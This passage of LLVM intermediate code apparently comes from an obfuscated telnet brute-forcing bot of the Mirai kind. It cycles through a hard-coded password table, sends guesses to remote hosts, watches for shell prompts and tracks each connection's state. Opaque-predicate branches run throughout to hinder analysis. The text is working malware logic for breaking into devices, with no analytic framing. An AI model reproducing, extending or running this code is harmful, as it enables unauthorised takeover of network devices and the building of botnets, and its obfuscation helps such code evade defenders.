  %845 = load i32, i32* %10, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 0
  %849 = load i32, i32* %848, align 16
  %850 = call i64 @send(i32 %849, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %851 = icmp slt i64 %850, 0
  br i1 %851, label %852, label %867

; <label>:852:                                    ; preds = %844
  %853 = load i32, i32* %10, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 0
  %857 = load i32, i32* %856, align 16
  %858 = call i32 @sclose(i32 %857)
  %859 = load i32, i32* %10, align 4
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %860
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %861, i32 0, i32 2
  store i8 0, i8* %862, align 8
  %863 = load i32, i32* %10, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 3
  store i8 1, i8* %866, align 1
  br label %1527

; <label>:867:                                    ; preds = %844
  %868 = load i32, i32* @x.63
  %869 = load i32, i32* @y.64
  %870 = sub i32 %868, 1
  %871 = mul i32 %868, %870
  %872 = urem i32 %871, 2
  %873 = icmp eq i32 %872, 0
  %874 = icmp slt i32 %869, 10
  %875 = or i1 %873, %874
  br i1 %875, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %867
  %876 = load i32, i32* %10, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 2
  store i8 4, i8* %879, align 8
  %880 = load i32, i32* @x.63
  %881 = load i32, i32* @y.64
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %1526

; <label>:888:                                    ; preds = %originalBBpart222
  %889 = load i32, i32* %10, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 6
  %893 = load i32, i32* %892, align 4
  %894 = icmp eq i32 %893, 0
  br i1 %894, label %895, label %901

; <label>:895:                                    ; preds = %888
  %896 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %897 = load i32, i32* %10, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 6
  store i32 %896, i32* %900, align 4
  br label %901

; <label>:901:                                    ; preds = %895, %888
  %902 = load i32, i32* %10, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 8
  %906 = load i8*, i8** %905, align 8
  %907 = call i32 @matchPrompt(i8* %906)
  %908 = icmp ne i32 %907, 0
  br i1 %908, label %909, label %914

; <label>:909:                                    ; preds = %901
  %910 = load i32, i32* %10, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 2
  store i8 7, i8* %913, align 8
  br label %914

; <label>:914:                                    ; preds = %909, %901
  %915 = load i32, i32* %10, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 0
  %919 = load i32, i32* %918, align 16
  %920 = load i32, i32* %10, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 8
  %924 = load i8*, i8** %923, align 8
  %925 = load i32, i32* %10, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 7
  %929 = load i16, i16* %928, align 16
  %930 = zext i16 %929 to i32
  %931 = call i32 @readUntil(i32 %919, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %924, i32 1024, i32 %930)
  %932 = icmp ne i32 %931, 0
  br i1 %932, label %933, label %1013

; <label>:933:                                    ; preds = %914
  %934 = load i32, i32* %10, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 6
  store i32 0, i32* %937, align 4
  %938 = load i32, i32* %10, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 7
  store i16 0, i16* %941, align 16
  %942 = load i32, i32* %10, align 4
  %943 = sext i32 %942 to i64
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %943
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %944, i32 0, i32 8
  %946 = load i8*, i8** %945, align 8
  %947 = call i8* @strstr(i8* %946, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0)) #10
  %948 = icmp ne i8* %947, null
  br i1 %948, label %949, label %970

; <label>:949:                                    ; preds = %933
  %950 = load i32, i32* @x.63
  %951 = load i32, i32* @y.64
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %949
  %958 = load i32, i32* %10, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 2
  store i8 5, i8* %961, align 8
  %962 = load i32, i32* @x.63
  %963 = load i32, i32* @y.64
  %964 = sub i32 %962, 1
  %965 = mul i32 %962, %964
  %966 = urem i32 %965, 2
  %967 = icmp eq i32 %966, 0
  %968 = icmp slt i32 %963, 10
  %969 = or i1 %967, %968
  br i1 %969, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %991

; <label>:970:                                    ; preds = %933
  %971 = load i32, i32* @x.63
  %972 = load i32, i32* @y.64
  %973 = sub i32 %971, 1
  %974 = mul i32 %971, %973
  %975 = urem i32 %974, 2
  %976 = icmp eq i32 %975, 0
  %977 = icmp slt i32 %972, 10
  %978 = or i1 %976, %977
  br i1 %978, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %970
  %979 = load i32, i32* %10, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 2
  store i8 7, i8* %982, align 8
  %983 = load i32, i32* @x.63
  %984 = load i32, i32* @y.64
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %991

; <label>:991:                                    ; preds = %originalBBpart290, %originalBBpart286
  %992 = load i32, i32* @x.63
  %993 = load i32, i32* @y.64
  %994 = sub i32 %992, 1
  %995 = mul i32 %992, %994
  %996 = urem i32 %995, 2
  %997 = icmp eq i32 %996, 0
  %998 = icmp slt i32 %993, 10
  %999 = or i1 %997, %998
  br i1 %999, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %991
  %1000 = load i32, i32* %10, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 8
  %1004 = load i8*, i8** %1003, align 8
  call void @llvm.memset.p0i8.i64(i8* %1004, i8 0, i64 1024, i32 1, i1 false)
  %1005 = load i32, i32* @x.63
  %1006 = load i32, i32* @y.64
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %1527

; <label>:1013:                                   ; preds = %914
  %1014 = load i32, i32* %10, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 8
  %1018 = load i8*, i8** %1017, align 8
  %1019 = call i8* @strstr(i8* %1018, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %1020 = icmp ne i8* %1019, null
  br i1 %1020, label %1021, label %1036

; <label>:1021:                                   ; preds = %1013
  %1022 = load i32, i32* %10, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 16
  %1027 = call i32 @sclose(i32 %1026)
  %1028 = load i32, i32* %10, align 4
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1029
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1030, i32 0, i32 2
  store i8 0, i8* %1031, align 8
  %1032 = load i32, i32* %10, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 3
  store i8 0, i8* %1035, align 1
  br label %1527

; <label>:1036:                                   ; preds = %1013
  %1037 = load i32, i32* %10, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 8
  %1041 = load i8*, i8** %1040, align 8
  %1042 = call i64 @strlen(i8* %1041) #10
  %1043 = trunc i64 %1042 to i16
  %1044 = load i32, i32* %10, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 7
  store i16 %1043, i16* %1047, align 16
  br label %1048

; <label>:1048:                                   ; preds = %1036
  %1049 = load i32, i32* %10, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 6
  %1053 = load i32, i32* %1052, align 4
  %1054 = add i32 %1053, 8
  %1055 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1056 = icmp ult i32 %1054, %1055
  br i1 %1056, label %1057, label %1072

; <label>:1057:                                   ; preds = %1048
  %1058 = load i32, i32* %10, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 0
  %1062 = load i32, i32* %1061, align 16
  %1063 = call i32 @sclose(i32 %1062)
  %1064 = load i32, i32* %10, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 2
  store i8 0, i8* %1067, align 8
  %1068 = load i32, i32* %10, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1070, i32 0, i32 3
  store i8 1, i8* %1071, align 1
  br label %1072

; <label>:1072:                                   ; preds = %1057, %1048
  %1073 = load i32, i32* @x.63
  %1074 = load i32, i32* @y.64
  %1075 = sub i32 %1073, 1
  %1076 = mul i32 %1073, %1075
  %1077 = urem i32 %1076, 2
  %1078 = icmp eq i32 %1077, 0
  %1079 = icmp slt i32 %1074, 10
  %1080 = or i1 %1078, %1079
  br i1 %1080, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %1072
  %1081 = load i32, i32* @x.63
  %1082 = load i32, i32* @y.64
  %1083 = sub i32 %1081, 1
  %1084 = mul i32 %1081, %1083
  %1085 = urem i32 %1084, 2
  %1086 = icmp eq i32 %1085, 0
  %1087 = icmp slt i32 %1082, 10
  %1088 = or i1 %1086, %1087
  br i1 %1088, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1526

; <label>:1089:                                   ; preds = %originalBBpart222
  %1090 = load i32, i32* %10, align 4
  %1091 = sext i32 %1090 to i64
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1091
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1092, i32 0, i32 0
  %1094 = load i32, i32* %1093, align 16
  %1095 = load i32, i32* %10, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 5
  %1099 = load i8, i8* %1098, align 1
  %1100 = zext i8 %1099 to i64
  %1101 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1100
  %1102 = load i8*, i8** %1101, align 8
  %1103 = load i32, i32* %10, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 5
  %1107 = load i8, i8* %1106, align 1
  %1108 = zext i8 %1107 to i64
  %1109 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1108
  %1110 = load i8*, i8** %1109, align 8
  %1111 = call i64 @strlen(i8* %1110) #10
  %1112 = call i64 @send(i32 %1094, i8* %1102, i64 %1111, i32 16384)
  %1113 = icmp slt i64 %1112, 0
  br i1 %1113, label %1114, label %1145

; <label>:1114:                                   ; preds = %1089
  %1115 = load i32, i32* @x.63
  %1116 = load i32, i32* @y.64
  %1117 = sub i32 %1115, 1
  %1118 = mul i32 %1115, %1117
  %1119 = urem i32 %1118, 2
  %1120 = icmp eq i32 %1119, 0
  %1121 = icmp slt i32 %1116, 10
  %1122 = or i1 %1120, %1121
  br i1 %1122, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %1114
  %1123 = load i32, i32* %10, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 0
  %1127 = load i32, i32* %1126, align 16
  %1128 = call i32 @sclose(i32 %1127)
  %1129 = load i32, i32* %10, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 2
  store i8 0, i8* %1132, align 8
  %1133 = load i32, i32* %10, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 3
  store i8 1, i8* %1136, align 1
  %1137 = load i32, i32* @x.63
  %1138 = load i32, i32* @y.64
  %1139 = sub i32 %1137, 1
  %1140 = mul i32 %1137, %1139
  %1141 = urem i32 %1140, 2
  %1142 = icmp eq i32 %1141, 0
  %1143 = icmp slt i32 %1138, 10
  %1144 = or i1 %1142, %1143
  br i1 %1144, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %1527

; <label>:1145:                                   ; preds = %1089
  %1146 = load i32, i32* %10, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 0
  %1150 = load i32, i32* %1149, align 16
  %1151 = call i64 @send(i32 %1150, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %1152 = icmp slt i64 %1151, 0
  br i1 %1152, label %1153, label %1168

; <label>:1153:                                   ; preds = %1145
  %1154 = load i32, i32* %10, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 0
  %1158 = load i32, i32* %1157, align 16
  %1159 = call i32 @sclose(i32 %1158)
  %1160 = load i32, i32* %10, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1161
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1162, i32 0, i32 2
  store i8 0, i8* %1163, align 8
  %1164 = load i32, i32* %10, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 3
  store i8 1, i8* %1167, align 1
  br label %1527

; <label>:1168:                                   ; preds = %1145
  %1169 = load i32, i32* %10, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 2
  store i8 6, i8* %1172, align 8
  br label %1526

; <label>:1173:                                   ; preds = %originalBBpart222
  %1174 = load i32, i32* %10, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 6
  %1178 = load i32, i32* %1177, align 4
  %1179 = icmp eq i32 %1178, 0
  br i1 %1179, label %1180, label %1202

; <label>:1180:                                   ; preds = %1173
  %1181 = load i32, i32* @x.63
  %1182 = load i32, i32* @y.64
  %1183 = sub i32 %1181, 1
  %1184 = mul i32 %1181, %1183
  %1185 = urem i32 %1184, 2
  %1186 = icmp eq i32 %1185, 0
  %1187 = icmp slt i32 %1182, 10
  %1188 = or i1 %1186, %1187
  br i1 %1188, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %1180
  %1189 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1190 = load i32, i32* %10, align 4
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 6
  store i32 %1189, i32* %1193, align 4
  %1194 = load i32, i32* @x.63
  %1195 = load i32, i32* @y.64
  %1196 = sub i32 %1194, 1
  %1197 = mul i32 %1194, %1196
  %1198 = urem i32 %1197, 2
  %1199 = icmp eq i32 %1198, 0
  %1200 = icmp slt i32 %1195, 10
  %1201 = or i1 %1199, %1200
  br i1 %1201, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1202

; <label>:1202:                                   ; preds = %originalBBpart2106, %1173
  %1203 = load i32, i32* %10, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 0
  %1207 = load i32, i32* %1206, align 16
  %1208 = load i32, i32* %10, align 4
  %1209 = sext i32 %1208 to i64
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1209
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1210, i32 0, i32 8
  %1212 = load i8*, i8** %1211, align 8
  %1213 = load i32, i32* %10, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 7
  %1217 = load i16, i16* %1216, align 16
  %1218 = zext i16 %1217 to i32
  %1219 = call i32 @readUntil(i32 %1207, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1212, i32 1024, i32 %1218)
  %1220 = icmp ne i32 %1219, 0
  br i1 %1220, label %1221, label %1312

; <label>:1221:                                   ; preds = %1202
  %1222 = load i32, i32* %10, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 6
  store i32 0, i32* %1225, align 4
  %1226 = load i32, i32* %10, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 7
  store i16 0, i16* %1229, align 16
  %1230 = load i32, i32* %10, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 8
  %1234 = load i8*, i8** %1233, align 8
  %1235 = call i8* @strstr(i8* %1234, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %1236 = icmp ne i8* %1235, null
  br i1 %1236, label %1237, label %1257

; <label>:1237:                                   ; preds = %1221
  %1238 = load i32, i32* %10, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 8
  %1242 = load i8*, i8** %1241, align 8
  call void @llvm.memset.p0i8.i64(i8* %1242, i8 0, i64 1024, i32 1, i1 false)
  %1243 = load i32, i32* %10, align 4
  %1244 = sext i32 %1243 to i64
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1244
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1245, i32 0, i32 0
  %1247 = load i32, i32* %1246, align 16
  %1248 = call i32 @sclose(i32 %1247)
  %1249 = load i32, i32* %10, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1250
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1251, i32 0, i32 2
  store i8 0, i8* %1252, align 8
  %1253 = load i32, i32* %10, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 3
  store i8 0, i8* %1256, align 1
  br label %1527

; <label>:1257:                                   ; preds = %1221
  %1258 = load i32, i32* %10, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 8
  %1262 = load i8*, i8** %1261, align 8
  %1263 = call i32 @matchPrompt(i8* %1262)
  %1264 = icmp ne i32 %1263, 0
  br i1 %1264, label %1285, label %1265

; <label>:1265:                                   ; preds = %1257
  %1266 = load i32, i32* %10, align 4
  %1267 = sext i32 %1266 to i64
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1268, i32 0, i32 8
  %1270 = load i8*, i8** %1269, align 8
  call void @llvm.memset.p0i8.i64(i8* %1270, i8 0, i64 1024, i32 1, i1 false)
  %1271 = load i32, i32* %10, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 0
  %1275 = load i32, i32* %1274, align 16
  %1276 = call i32 @sclose(i32 %1275)
  %1277 = load i32, i32* %10, align 4
  %1278 = sext i32 %1277 to i64
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1278
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1279, i32 0, i32 2
  store i8 0, i8* %1280, align 8
  %1281 = load i32, i32* %10, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1282
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1283, i32 0, i32 3
  store i8 1, i8* %1284, align 1
  br label %1527

; <label>:1285:                                   ; preds = %1257
  %1286 = load i32, i32* @x.63
  %1287 = load i32, i32* @y.64
  %1288 = sub i32 %1286, 1
  %1289 = mul i32 %1286, %1288
  %1290 = urem i32 %1289, 2
  %1291 = icmp eq i32 %1290, 0
  %1292 = icmp slt i32 %1287, 10
  %1293 = or i1 %1291, %1292
  br i1 %1293, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %1285
  %1294 = load i32, i32* %10, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 2
  store i8 7, i8* %1297, align 8
  %1298 = load i32, i32* @x.63
  %1299 = load i32, i32* @y.64
  %1300 = sub i32 %1298, 1
  %1301 = mul i32 %1298, %1300
  %1302 = urem i32 %1301, 2
  %1303 = icmp eq i32 %1302, 0
  %1304 = icmp slt i32 %1299, 10
  %1305 = or i1 %1303, %1304
  br i1 %1305, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %1306

; <label>:1306:                                   ; preds = %originalBBpart2110
  %1307 = load i32, i32* %10, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 8
  %1311 = load i8*, i8** %1310, align 8
  call void @llvm.memset.p0i8.i64(i8* %1311, i8 0, i64 1024, i32 1, i1 false)
  br label %1527

; <label>:1312:                                   ; preds = %1202
  %1313 = load i32, i32* @x.63
  %1314 = load i32, i32* @y.64
  %1315 = sub i32 %1313, 1
  %1316 = mul i32 %1313, %1315
  %1317 = urem i32 %1316, 2
  %1318 = icmp eq i32 %1317, 0
  %1319 = icmp slt i32 %1314, 10
  %1320 = or i1 %1318, %1319
  br i1 %1320, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %1312
  %1321 = load i32, i32* %10, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1322
